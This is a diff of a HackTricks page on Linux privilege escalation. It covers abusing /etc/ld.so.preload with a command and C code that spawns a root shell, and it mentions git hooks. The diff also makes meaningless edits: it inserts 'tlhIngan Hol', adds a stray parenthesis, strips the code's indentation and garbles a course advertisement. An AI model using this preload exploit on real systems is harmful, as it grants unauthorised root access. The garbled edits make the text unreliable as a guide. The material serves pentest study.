@@ -16,26 +16,24 @@ Other ways to support HackTricks:
 
 ### /etc/ld.so.preload
 
-This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
+**tlhIngan Hol** (This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
 If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.
 
-For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
-
+For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`)
 ```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
 
 void _init() {
-    unlink("/etc/ld.so.preload");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
+unlink("/etc/ld.so.preload");
+setgid(0);
+setuid(0);
+system("/bin/bash");
 }
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-
 ### Git hooks
 
 [**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.
@@ -51,7 +49,7 @@ chmod +x pre-commit
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
